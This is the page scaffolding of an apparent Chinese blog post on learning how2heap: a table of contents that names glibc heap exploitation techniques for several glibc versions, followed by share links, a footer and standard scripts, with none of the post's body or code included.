      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#how2heap"><span class="toc-number">1.</span> <span class="toc-text">how2heap</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#first-fit-c"><span class="toc-number">1.1.</span> <span class="toc-text">first_fit.c</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#glibc-2-23"><span class="toc-number">1.2.</span> <span class="toc-text">glibc_2.23</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#fastbin-dup-double-free"><span class="toc-number">1.2.1.</span> <span class="toc-text">fastbin_dup(double free)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fastbin-dup-into-stack"><span class="toc-number">1.2.2.</span> <span class="toc-text">fastbin_dup_into_stack</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fastbin-dup-consolidate-double-free-malloc-consolidate"><span class="toc-number">1.2.3.</span> <span class="toc-text">fastbin_dup_consolidate(double free-malloc_consolidate)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#house-of-spirit-%E4%BC%AA%E9%80%A0chunk"><span class="toc-number">1.2.4.</span> <span class="toc-text">house_of_spirit(伪造chunk)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#poison-null-byte-off-by-null"><span class="toc-number">1.2.5.</span> <span class="toc-text">poison_null_byte(off-by-null)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#house-of-lore-small-bin"><span class="toc-number">1.2.6.</span> <span class="toc-text">house_of_lore(small bin)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#overlapping-chunks"><span class="toc-number">1.2.7.</span> <span class="toc-text">overlapping_chunks</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#overlapping-chunks-2"><span class="toc-number">1.2.8.</span> <span class="toc-text">overlapping_chunks_2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#house-of-force-top-chunk"><span class="toc-number">1.2.9.</span> <span class="toc-text">house_of_force(top_chunk)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#unsorted-bin-attack"><span class="toc-number">1.2.10.</span> <span class="toc-text">unsorted_bin_attack</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#house-of-einherjar-off-by-null"><span class="toc-number">1.2.11.</span> <span class="toc-text">house_of_einherjar(off-by-null)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#house-of-orange-top-chunk-FSOP"><span class="toc-number">1.2.12.</span> <span class="toc-text">house_of_orange(top chunk + FSOP)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#house-of-roman-%E6%97%A0show%E5%87%BD%E6%95%B0"><span class="toc-number">1.2.13.</span> <span class="toc-text">house_of_roman(无show函数)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#large-bin-attack%EF%BC%88%E8%B7%9F-unsorted-bin-attack-%E5%AE%9E%E7%8E%B0%E7%9A%84%E5%8A%9F%E8%83%BD%E5%B7%AE%E4%B8%8D%E5%A4%9A%EF%BC%89"><span class="toc-number">1.2.14.</span> <span class="toc-text">large_bin_attack（跟 unsorted bin attack 实现的功能差不多）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#house-of-storm-unsorted-bin-attack-large-bin-attack"><span class="toc-number">1.2.15.</span> <span class="toc-text">house_of_storm(unsorted bin attack + large bin attack)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mmap-overlapping-chunks%EF%BC%88mmap%EF%BC%89"><span class="toc-number">1.2.16.</span> <span class="toc-text">mmap_overlapping_chunks（mmap）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#glibc-2-27"><span class="toc-number">1.3.</span> <span class="toc-text">glibc_2.27</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#fastbin-dup-double-free-1"><span class="toc-number">1.3.1.</span> <span class="toc-text">fastbin_dup(double free)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fastbin-dup-into-stack-%E5%88%86%E9%85%8D%E5%88%B0%E6%A0%88%E4%B8%8A"><span class="toc-number">1.3.2.</span> <span class="toc-text">fastbin_dup_into_stack(分配到栈上)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fastbin-reverse-into-tcache"><span class="toc-number">1.3.3.</span> <span class="toc-text">fastbin_reverse_into_tcache</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#house-of-botcake-double-free"><span class="toc-number">1.3.4.</span> <span class="toc-text">house_of_botcake(double free)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#tcache-poisoning-%E6%89%93fd"><span class="toc-number">1.3.5.</span> <span class="toc-text">tcache_poisoning(打fd)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#tcache-house-of-spirit%EF%BC%88%E5%9C%A8%E6%A0%88%E4%B8%8A%E4%BC%AA%E9%80%A0chunk%EF%BC%89"><span class="toc-number">1.3.6.</span> <span class="toc-text">tcache_house_of_spirit（在栈上伪造chunk）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#tcache-stashing-unlink-attack-2-27-amp-2-29-smallbin-amp-calloc"><span class="toc-number">1.3.7.</span> <span class="toc-text">tcache_stashing_unlink_attack(2.27&amp;2.29 smallbin &amp; calloc)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fastbin-dup-consolidate-double-free"><span class="toc-number">1.3.8.</span> <span class="toc-text">fastbin_dup_consolidate(double free)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#overlapping-chunks-off-by-one"><span class="toc-number">1.3.9.</span> <span class="toc-text">overlapping_chunks(off-by-one)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#poison-null-byte-off-by-null-1"><span class="toc-number">1.3.10.</span> <span class="toc-text">poison_null_byte(off-by-null)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mmap-overlapping-chunks-mmap"><span class="toc-number">1.3.11.</span> <span class="toc-text">mmap_overlapping_chunks(mmap)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#house-of-botcake-double-free-1"><span class="toc-number">1.3.12.</span> <span class="toc-text">house_of_botcake(double free)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#house-of-einherjar-off-by-null-1"><span class="toc-number">1.3.13.</span> <span class="toc-text">house_of_einherjar(off-by-null)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#house-of-force-top-chunk-1"><span class="toc-number">1.3.14.</span> <span class="toc-text">house_of_force(top chunk)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#house-of-lore-small-bin-1"><span class="toc-number">1.3.15.</span> <span class="toc-text">house_of_lore(small bin)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#house-of-mind-fastbin-arena"><span class="toc-number">1.3.16.</span> <span class="toc-text">house_of_mind_fastbin(arena)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#unsorted-bin-attack-1"><span class="toc-number">1.3.17.</span> <span class="toc-text">unsorted_bin_attack</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#large-bin-attack"><span class="toc-number">1.3.18.</span> <span class="toc-text">large_bin_attack</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#house-of-storm-largebin-unsortedbin"><span class="toc-number">1.3.19.</span> <span class="toc-text">house_of_storm(largebin + unsortedbin)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-31"><span class="toc-number">1.4.</span> <span class="toc-text">2.31</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#fastbin-dup%EF%BC%88double-free"><span class="toc-number">1.4.1.</span> <span class="toc-text">fastbin_dup（double free)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fastbin-dup-into-stack-%E5%88%86%E9%85%8D%E5%88%B0%E6%A0%88%E4%B8%8A-1"><span class="toc-number">1.4.2.</span> <span class="toc-text">fastbin_dup_into_stack(分配到栈上)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fastbin-reverse-into-tcache-1"><span class="toc-number">1.4.3.</span> <span class="toc-text">fastbin_reverse_into_tcache</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reference"><span class="toc-number">1.5.</span> <span class="toc-text">Reference</span></a></li></ol></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/&amp;text=how2heap系列学习(持续更新)"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/&amp;title=how2heap系列学习(持续更新)"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/&amp;is_video=false&amp;description=how2heap系列学习(持续更新)"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=how2heap系列学习(持续更新)&amp;body=Check out this article: http://example.com/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/&amp;title=how2heap系列学习(持续更新)"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/&amp;title=how2heap系列学习(持续更新)"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/&amp;title=how2heap系列学习(持续更新)"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/&amp;title=how2heap系列学习(持续更新)"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/&amp;name=how2heap系列学习(持续更新)&amp;description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/&amp;t=how2heap系列学习(持续更新)"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright ©
    
    
    2021-2023
    z1r0
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="https://github.com/z1r00?tab=repositories">Projects</a></li><!--
     --><!--
       --><li><a href="/links/">links</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'">


    <!-- jquery -->
 
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="far fa-clone"></i>';
    btn += '</span>'; 
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Google Analytics -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Umami Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->



<script type="text/javascript" charset="utf-8" src="/js/lazyload-plugin/lazyload.intersectionObserver.min.js"></script></body></html>